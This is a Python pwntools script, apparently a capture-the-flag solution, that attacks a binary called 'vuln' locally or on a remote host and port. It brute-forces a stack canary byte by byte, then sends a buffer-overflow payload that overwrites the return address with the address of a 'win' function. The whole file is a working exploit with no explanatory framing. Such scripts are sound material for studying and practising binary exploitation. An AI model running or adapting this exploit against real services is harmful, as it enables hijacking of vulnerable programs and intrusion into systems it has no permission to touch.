import pwn
import argparse

pwn.context.log_level = "critical"

parser = argparse.ArgumentParser()
parser.add_argument("destination", type=str, choices={"local","remote"})
parser.add_argument("--target", "-t", type=str, default="", required=False)
parser.add_argument("--port", "-p", type=int, default=0, required=False)
args = parser.parse_args()
# print(args.destination)


elf = pwn.ELF("./vuln")

#get memory adress of win function in the binary
win_adress = elf.symbols["win"]

canary_value = bytearray(b"")

# g = pwn.gdb.attach(p) #link to gdb to debug locally


#sends and receives data just like sockets but locally
# print(p.recv().decode("utf-8"))

offset = 64
new_eip = pwn.p32(elf.symbols["win"])
# return_adress = pwn.p32(elf.symbols["main"])

while len(canary_value) < 4:
	for byte in range(1,256):
		payload = b"".join(
			[
				b"A"*offset,
				canary_value + chr(byte).encode("utf-8"),
				# b"A"*(16 + (4 - len(canary_value))),
				# new_eip,
			]
			)

		print(f"{payload=}")
		with open("payload", "wb") as file:
			file.write(b"1000\n" + payload)


		if args.destination == "local":
			p = elf.process() #runs the program as a process to interact with it locally

		elif args.destination == "remote":
			if not args.target or not args.port:
				pwn.error("provide -t for target host and -p for port")
				exit()
			p = pwn.remote(args.target, args.port)

		# pwn.gdb.attach(p, """
		# 	r < payload
		# 	""")

		p.recvline().decode("utf-8")
		payload_size = str(len(payload)).encode("utf-8")
		# print(f"Sending pyaload of size  {payload_size}")
		p.sendline(payload_size)
		p.recvuntil(b"Input> ")
		p.sendline(payload)
		response = p.recvall().decode("latin1")
		# print(f"{response=}")
		# p.interactive() #interact with the process locally

		if "Flag?" in response:
			canary_value += chr(byte).encode("utf-8")
			print(f"The value being tried so far .... {canary_value}")
			break


payload = b"".join(
	[
		b"A"*offset,
		canary_value,
		b"A"*(16 + (4 - len(canary_value))),
		new_eip,
	]
	)

# print(f"{payload=}")
pwn.log.info(f"leaked canary value so far .... {canary_value}")


with open("payload", "wb") as file:
	file.write(b"1000\n" + payload)


if args.destination == "local":
	p = elf.process() #runs the program as a process to interact with it locally

elif args.destination == "remote":
	if not args.target or not args.port:
		pwn.error("provide -t for target host and -p for port")
		exit()
	p = pwn.remote(args.target, args.port)

# pwn.gdb.attach(p, """
# 	r < payload
# 	""")

p.recvline().decode("utf-8")
payload_size = str(len(payload)).encode("utf-8")
print(f"Sending pyaload of size  {payload_size}")
p.sendline(payload_size)
p.recvuntil(b"Input> ")
p.sendline(payload)
response = p.recvall().decode("latin1")
print(f"{response=}")
# p.interactive() #interact with the process locally
